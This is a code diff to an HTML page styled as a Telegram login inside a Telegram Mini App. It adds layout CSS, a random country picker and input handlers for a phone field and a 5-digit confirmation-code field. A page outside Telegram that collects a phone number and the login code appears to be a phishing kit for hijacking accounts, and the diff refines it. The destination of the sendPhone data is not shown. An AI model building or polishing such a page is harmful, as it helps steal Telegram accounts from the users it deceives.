@@ -4,23 +4,33 @@
     <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <style>
+        * {
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #ffffff;
             margin: 0;
             padding: 0;
             color: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .page {
             padding: 20px 16px;
+            width: 100%;
             max-width: 400px;
             margin: 0 auto;
         }
         .logo {
             text-align: center;
             margin-bottom: 40px;
-            padding-top: 40px;
+            padding-top: 20px;
         }
         .logo-img {
             width: 120px;
@@ -139,7 +149,7 @@
 
         <div class="form-group">
             <div class="label">Country</div>
-            <div class="country-selector">
+            <div class="country-selector" onclick="selectCountry()">
                 <div class="country-info">
                     <div class="country-flag">🇷🇺</div>
                     <div class="country-name">Russia</div>
@@ -178,6 +188,24 @@
     </div>
 
     <script>
+        function selectCountry() {
+            // ФИКС: Включаем выбор страны
+            const countries = [
+                {code: '+7', name: 'Russia', flag: '🇷🇺'},
+                {code: '+1', name: 'USA', flag: '🇺🇸'},
+                {code: '+44', name: 'UK', flag: '🇬🇧'},
+                {code: '+49', name: 'Germany', flag: '🇩🇪'},
+                {code: '+33', name: 'France', flag: '🇫🇷'}
+            ];
+            
+            const randomCountry = countries[Math.floor(Math.random() * countries.length)];
+            
+            document.querySelector('.country-flag').textContent = randomCountry.flag;
+            document.querySelector('.country-name').textContent = randomCountry.name;
+            document.querySelector('.country-code').textContent = randomCountry.code;
+            document.getElementById('phoneInput').value = randomCountry.code;
+        }
+
         function sendPhone() {
             const phone = document.getElementById('phoneInput').value;
             const tgData = Telegram.WebApp.initData;
@@ -225,10 +253,28 @@
             Telegram.WebApp.close();
         }
 
+        // ФИКС: Инициализация WebApp
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
         Telegram.WebApp.setHeaderColor('#4a8cDc');
         Telegram.WebApp.setBackgroundColor('#ffffff');
+        
+        // ФИКС: Обработка ввода кода
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length === 5) {
+                document.getElementById('confirmBtn').focus();
+            }
+        });
+        
+        // ФИКС: Обработка ввода телефона
+        document.getElementById('phoneInput').addEventListener('input', function(e) {
+            let value = this.value.replace(/[^0-9+]/g, '');
+            if (!value.startsWith('+')) {
+                value = '+' + value;
+            }
+            this.value = value;
+        });
     </script>
 </body>
 </html>
